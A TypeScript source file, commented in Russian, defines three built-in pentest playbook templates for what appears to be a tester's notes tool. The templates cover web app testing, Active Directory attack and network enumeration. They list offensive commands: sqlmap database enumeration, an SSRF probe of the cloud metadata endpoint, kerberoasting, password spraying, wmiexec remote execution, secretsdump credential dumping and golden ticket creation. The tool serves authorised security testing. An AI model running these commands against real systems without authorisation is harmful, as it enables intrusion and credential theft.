// ============================================================================
// Встроенные шаблоны плейбуков (Задача 3.7)
// ============================================================================
// Готовые заготовки, чтобы не стартовать с пустого листа. Каждый шаблон — это
// markdown в ТОМ ЖЕ формате, что понимает импорт (см. importExport.ts), поэтому
// применяются они через уже существующий autoDetect + applyParsed — отдельного
// парсера не нужно.
//
// Тройные backtick-фенсы кода нельзя писать буквально внутри backtick-строки
// (они закрывают шаблонную строку), поэтому сам markdown собираем из массива
// строк, а ограждение задаём константой F.

export interface PlaybookTemplate {
  id: string;
  title: string;
  /** Короткое описание для карточки выбора. */
  description: string;
  /** Эмодзи-иконка для карточки. */
  icon: string;
  /** Сколько секций/команд внутри — для превью на карточке. */
  sections: number;
  commands: number;
  /** Содержимое в markdown-формате импорта. */
  markdown: string;
}

const F = "```"; // ограждение блока кода

/** Одна команда в формате импорта: описание, блок кода, теги. */
function cmd(lang: string, code: string, desc: string, tags: string[]): string[] {
  return [desc, "", F + lang, code, F, "Tags: " + tags.map((t) => "#" + t).join(", "), ""];
}

const WEB_PENTEST = [
  "# Playbook: Web Application Pentest",
  "",
  "<!-- Variables:",
  "  $TARGET = target.com — домен или IP цели",
  "  $URL = https://target.com — базовый URL приложения",
  "  $WORDLIST = /usr/share/wordlists/dirb/common.txt — список для перебора путей",
  "-->",
  "",
  "## Recon & Enumeration",
  "<!-- color: #3b82f6 -->",
  "",
  ...cmd(
    "bash",
    "subfinder -d $TARGET -silent | httpx -silent -title -status-code",
    "Определение поддоменов цели.",
    ["recon", "subdomains"],
  ),
  ...cmd(
    "bash",
    "ffuf -u $URL/FUZZ -w $WORDLIST -mc 200,204,301,302,307,401,403 -o ffuf.json",
    "Перебор директорий и файлов.",
    ["fuzzing", "content-discovery"],
  ),
  ...cmd("bash", "whatweb -a 3 $URL", "Снятие технологического отпечатка.", ["fingerprint"]),
  "## Fuzzing & Scanning",
  "<!-- color: #eab308 -->",
  "",
  ...cmd(
    "bash",
    "nuclei -u $URL -severity low,medium,high,critical -o nuclei.txt",
    "Быстрый скан уязвимостей шаблонами nuclei.",
    ["nuclei", "scan"],
  ),
  ...cmd("bash", "arjun -u $URL -m GET,POST", "Перебор скрытых параметров.", ["params"]),
  "## Exploitation",
  "<!-- color: #ef4444 -->",
  "",
  ...cmd(
    "bash",
    "sqlmap -u '$URL/page?id=1' --batch --risk=3 --level=5 --dbs",
    "Автоматизированная проверка SQL-инъекций.",
    ["sqli", "sqlmap"],
  ),
  ...cmd("bash", "dalfox url '$URL/search?q=FUZZ'", "Проверка XSS в параметрах.", ["xss"]),
  "## Post-Exploitation",
  "<!-- color: #a855f7 -->",
  "",
  ...cmd(
    "bash",
    "curl -s '$URL/fetch?url=http://169.254.169.254/latest/meta-data/'",
    "Проверка доступа к внутренним сервисам через SSRF.",
    ["ssrf", "cloud"],
  ),
].join("\n");

const AD_ATTACK = [
  "# Playbook: Active Directory Attack",
  "",
  "<!-- Variables:",
  "  $DC = 10.10.10.10 — IP контроллера домена",
  "  $DOMAIN = corp.local — FQDN домена",
  "  $USER = jdoe — имя пользователя",
  "  $PASS = Password123 — пароль пользователя",
  "-->",
  "",
  "## Recon & Enumeration",
  "<!-- color: #3b82f6 -->",
  "",
  ...cmd(
    "bash",
    "bloodhound-python -d $DOMAIN -u $USER -p $PASS -ns $DC -c All",
    "Сбор данных о домене через BloodHound.",
    ["bloodhound", "recon"],
  ),
  ...cmd(
    "bash",
    "netexec smb $DC -u $USER -p $PASS --users --groups",
    "Перечисление пользователей и групп.",
    ["enum", "netexec"],
  ),
  ...cmd(
    "bash",
    "impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC -request",
    "Поиск SPN для kerberoasting.",
    ["kerberoast"],
  ),
  "## Exploitation",
  "<!-- color: #ef4444 -->",
  "",
  ...cmd(
    "bash",
    "impacket-GetNPUsers $DOMAIN/ -dc-ip $DC -usersfile users.txt -no-pass",
    "AS-REP roasting для пользователей без преаутентификации.",
    ["asreproast"],
  ),
  ...cmd(
    "bash",
    "netexec smb $DC -u users.txt -p '$PASS' --continue-on-success",
    "Password spraying по домену.",
    ["spray"],
  ),
  "## Pivoting & Lateral Movement",
  "<!-- color: #14b8a6 -->",
  "",
  ...cmd(
    "bash",
    "impacket-wmiexec $DOMAIN/$USER:$PASS@$DC",
    "Удалённое выполнение через WMI.",
    ["lateral", "wmi"],
  ),
  ...cmd(
    "bash",
    "impacket-secretsdump $DOMAIN/$USER:$PASS@$DC",
    "Дамп секретов домена (при правах).",
    ["dcsync", "credentials"],
  ),
  "## Post-Exploitation",
  "<!-- color: #a855f7 -->",
  "",
  ...cmd(
    "bash",
    "impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain $DOMAIN Administrator",
    "Создание Golden Ticket (krbtgt-хэш).",
    ["persistence", "golden-ticket"],
  ),
].join("\n");

const NETWORK_ENUM = [
  "# Playbook: Network Enumeration",
  "",
  "<!-- Variables:",
  "  $TARGET = 10.10.10.0/24 — подсеть или IP цели",
  "  $IP = 10.10.10.5 — конкретный хост",
  "-->",
  "",
  "## Recon & Enumeration",
  "<!-- color: #3b82f6 -->",
  "",
  ...cmd("bash", "nmap -sn $TARGET -oA hosts", "Быстрое обнаружение живых хостов.", [
    "discovery",
    "nmap",
  ]),
  ...cmd(
    "bash",
    "nmap -p- --min-rate 5000 -T4 $IP -oA allports",
    "Полное сканирование портов хоста.",
    ["portscan"],
  ),
  ...cmd(
    "bash",
    "nmap -sV -sC -p <PORTS> $IP -oA services",
    "Сервис- и версия-детект по открытым портам.",
    ["services", "scripts"],
  ),
  "## Fuzzing & Scanning",
  "<!-- color: #eab308 -->",
  "",
  ...cmd("bash", "netexec smb $IP --shares -u '' -p ''", "Перечисление SMB-шар.", ["smb"]),
  ...cmd(
    "bash",
    "nmap -p21 --script ftp-anon $IP",
    "Проверка анонимного доступа к FTP.",
    ["ftp"],
  ),
  ...cmd("bash", "snmpwalk -v2c -c public $IP", "Enumeration SNMP.", ["snmp"]),
  "## Exploitation",
  "<!-- color: #ef4444 -->",
  "",
  ...cmd(
    "bash",
    "searchsploit <service> <version>",
    "Поиск известных уязвимостей по версиям сервисов.",
    ["searchsploit", "cve"],
  ),
].join("\n");

export const PLAYBOOK_TEMPLATES: PlaybookTemplate[] = [
  {
    id: "web-pentest",
    title: "Web Application Pentest",
    description: "Recon, фаззинг, эксплуатация и пост-эксплуатация веб-приложения.",
    icon: "🌐",
    sections: 4,
    commands: 8,
    markdown: WEB_PENTEST,
  },
  {
    id: "ad-attack",
    title: "Active Directory Attack",
    description: "Путь по домену: enum, roasting, lateral movement, персистентность.",
    icon: "🏛️",
    sections: 4,
    commands: 8,
    markdown: AD_ATTACK,
  },
  {
    id: "network-enum",
    title: "Network Enumeration",
    description: "Обнаружение хостов, сканирование портов и сервисов, поиск уязвимостей.",
    icon: "📡",
    sections: 3,
    commands: 7,
    markdown: NETWORK_ENUM,
  },
];
